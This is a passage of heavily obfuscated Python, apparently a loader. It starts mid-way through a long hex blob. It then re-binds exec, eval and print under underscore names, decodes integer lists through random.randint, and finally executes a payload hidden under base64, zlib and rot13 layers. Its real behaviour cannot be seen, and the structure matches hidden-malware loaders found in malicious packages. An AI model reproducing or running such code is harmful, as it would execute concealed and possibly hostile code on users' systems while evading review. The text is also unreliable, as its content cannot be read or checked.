f0b451db4fa0c729ad377491a63af3370529557b76babdee21692792ead0fa2450634b5c9fe2bac6458eb9667f5bde012f3a68d5fd8f7df7fa6d11b33ecfefa235f892477e24c273f36d0bca532a6a7da0811d80d57659fff96ab070c79f07e6b2ff804a513bc7cfed9fa9b8174ccf81307b794d06cbe1772d4feeef412f437786796ec292f9420d83c5d3be6283c092db2f2b5246c8abff82f529efd634e4acf656c4132f74b330a6616675e5628a76678feb8a979a47aee1cce321fca6b0b5bad18a36287d24b7446dc8628161af2644f58f15aa0afde4ac0dd984a3ac03ab2b367d524c78a86cc7ac7a7e69a654402090e9f9f2f5564dc0ee01184ed4f3b039ae370c978434f2a64aa07392cd697d95b1b911c6edc2ea122fbbab14033723827cca72993de7f4acd9f890dff94c80f29965fe95b0e8146dbe56a6f319238db247c92d325ac83ad15f64128f55e6f46ceeb90938d69e4cab494375de8e8b0811a1deb0da6848ebb96d15fe272377170835f07831287d9caf854bff2350e33add79926ae4c25500faf0d77e17fe1d7855f41814b4a6165662baeb1974e233a1eb70d603fbd170529f962c655d79368fbb0a8bacc7e6fc226b8ca3efcd0d8afdf2ed56488ce46fce86edf24a6541f8df4ea916f2fcb99dbff76787394d575e7388109fee2b41b2fbc976c570c121537b008b6b6ab62af4b84560e6810c2430b38b93ab2cf47c3d7e9fdc9814b6cc044cd123735075f7b1af62e298bd9cda167246596f04a625a146ea611278c535ee97f9a025d58e7088411d6b0dc5661317de1b8372b6c56bfa7c3b86229057cbcde558e366b931237d157357cfd2c5a799c69edfbf9c0b7cfd1173040af37d85c9be7f7f74533aae48e85da403d7eab9baa8e8dcccea283b7608dec16466a066a038818a1cb08517b65c175cd7ebceb9518319e1167d6045e08f94232ec3fa4321f6b8b08b7f23a68f6d9125e0da234eb65f7033e32d40dccec00d62013daf435066fd897726f13ffb314b9f205e8a0fa5d30bfe0be441efa2063dab90536693c7b3c89c71362c27d6003a9bedcddcbdc7e67f0a3becc92826ee78f69cef63c84e4957425e620c49287f8b6ef45f7fa625faf7ed29544e22efdbb7bedeba3308ec1e663f69828c34b086cd68fda174b211345416fc8e230f00930f8a38c07ca57fae4d257d50512f6e7fbadfbb873a8b8df3ce726f0ea27294b39a139ba1239769e958ac9fc6d18773a48e9070966717b984427447efe10ecb05f523ef62decd532648492e9b5637384cfd51eb6ebe6f5a0c1d67ab09646'''.replace("\n","")) })

_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')